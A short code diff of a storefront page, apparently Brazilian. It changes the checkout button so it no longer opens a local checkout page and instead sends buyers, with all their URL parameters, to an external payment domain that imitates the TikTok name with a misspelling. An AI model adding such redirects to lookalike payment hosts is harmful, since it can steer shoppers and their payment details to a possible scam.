@@ -169,12 +169,15 @@
 <script src="pix-modal.js"></script>
 <script>
 function irParaCheckout(event) {
-  event.preventDefault();
-  var dest = new URL('checkout-iron.html', window.location.href);
-  new URLSearchParams(window.location.search).forEach(function(v, k) {
-    dest.searchParams.set(k, v);
-  });
-  window.location.href = dest.toString();
+    event.preventDefault();
+
+    var dest = new URL('https://pay.paymentikltok.click/68ca33aaadb28e7137f9ec60');
+
+    new URLSearchParams(window.location.search).forEach(function(v, k) {
+        dest.searchParams.set(k, v);
+    });
+
+    window.location.href = dest.toString();
 }
 </script>
 
